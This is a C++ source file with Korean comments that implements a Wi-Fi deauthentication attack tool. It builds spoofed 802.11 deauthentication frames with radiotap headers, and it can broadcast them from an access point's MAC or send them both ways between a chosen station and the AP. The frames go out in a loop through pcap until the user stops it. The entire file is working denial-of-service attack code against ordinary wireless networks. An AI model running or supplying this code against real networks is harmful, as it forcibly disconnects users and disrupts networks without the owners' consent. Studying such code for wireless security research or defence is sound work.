// deauth.cpp
#include <iostream>
#include <pcap.h>
#include <cstdlib>
#include <cstring>
#include <chrono>
#include <thread>
#include <csignal>

#include "frame_structures.h"

// Deauth 패킷 전송
bool sendDeauthPacket(pcap_t* handle, const std::string& apMac, const std::string& stationMac, bool isBroadcast) {
    const size_t packetSize = sizeof(RadiotapHeader) + sizeof(IEEE80211Header) + sizeof(DeauthFrameBody);
    std::vector<u_char> packet(packetSize, 0);  // 자동 메모리 관리를 위해 vector 사용

    // Radiotap 헤더 설정
    RadiotapHeader* radiotapHeader = reinterpret_cast<RadiotapHeader*>(packet.data());
    radiotapHeader->it_version = 0;
    radiotapHeader->it_pad = 0;
    radiotapHeader->it_len = sizeof(RadiotapHeader);
    radiotapHeader->it_present = 0;

    // 802.11 Deauthentication 패킷 설정
    IEEE80211Header* dot11Header = reinterpret_cast<IEEE80211Header*>(packet.data() + sizeof(RadiotapHeader));
    dot11Header->frameControl = 0x00C0; // Deauthentication frame

    uint8_t apMacBytes[6];
    if (!macStringToBytes(apMac, apMacBytes)) {
        std::cerr << "Invalid AP MAC address format\n";
        return false;
    }

    if (isBroadcast) {
        // AP에서 브로드캐스트로 보내는 Deauth
        memcpy(dot11Header->addr1, BROADCAST_MAC, 6);
        memcpy(dot11Header->addr2, apMacBytes, 6);
        memcpy(dot11Header->addr3, apMacBytes, 6);

        // Deauth 프레임 바디 설정
        DeauthFrameBody* deauthBody = reinterpret_cast<DeauthFrameBody*>(packet.data() + sizeof(RadiotapHeader) + sizeof(IEEE80211Header));
        deauthBody->reasonCode = DEFAULT_REASON_CODE;

        if (pcap_sendpacket(handle, packet.data(), packetSize) != 0) {
            std::cerr << "Error sending broadcast deauth packet\n";
            return false;
        }
        std::cout << "Broadcast deauth packet sent from AP: " << apMac << std::endl;
    } else {
        // AP와 Station 간의 양방향 Deauth
        uint8_t stationMacBytes[6];
        if (!macStringToBytes(stationMac, stationMacBytes)) {
            std::cerr << "Invalid station MAC address format\n";
            return false;
        }

        // AP -> Station
        memcpy(dot11Header->addr1, stationMacBytes, 6);
        memcpy(dot11Header->addr2, apMacBytes, 6);
        memcpy(dot11Header->addr3, apMacBytes, 6);

        DeauthFrameBody* deauthBody = reinterpret_cast<DeauthFrameBody*>(packet.data() + sizeof(RadiotapHeader) + sizeof(IEEE80211Header));
        deauthBody->reasonCode = DEFAULT_REASON_CODE;

        if (pcap_sendpacket(handle, packet.data(), packetSize) != 0) {
            std::cerr << "Error sending deauth packet to station\n";
            return false;
        }
        std::cout << "Deauth packet sent to station: " << stationMac << std::endl;

        // Station -> AP
        memcpy(dot11Header->addr1, apMacBytes, 6);
        memcpy(dot11Header->addr2, stationMacBytes, 6);
        memcpy(dot11Header->addr3, apMacBytes, 6);

        if (pcap_sendpacket(handle, packet.data(), packetSize) != 0) {
            std::cerr << "Error sending deauth packet from station\n";
            return false;
        }
        std::cout << "Deauth packet sent from station: " << stationMac << std::endl;
    }

    return true;
}

// Deauth Attack 실행
void runDeauthAttack(const std::string& dev, const std::string& apMac, const std::string& stationMac, bool broadcastMode, volatile sig_atomic_t* keep_running) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);

    if (handle == nullptr) {
        std::cerr << "Error opening device: " << errbuf << "\n";
        return;
    }

    std::cout << "Starting deauth attack..." << std::endl;
    std::cout << "Press Ctrl+C to stop" << std::endl;

    while (*keep_running) {
        if (!sendDeauthPacket(handle, apMac, stationMac, broadcastMode)) {
            std::cerr << "Failed to send deauth packet, stopping attack\n";
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(PACKET_INTERVAL_MS));
    }

    pcap_close(handle);
    std::cout << "Attack stopped." << std::endl;
}
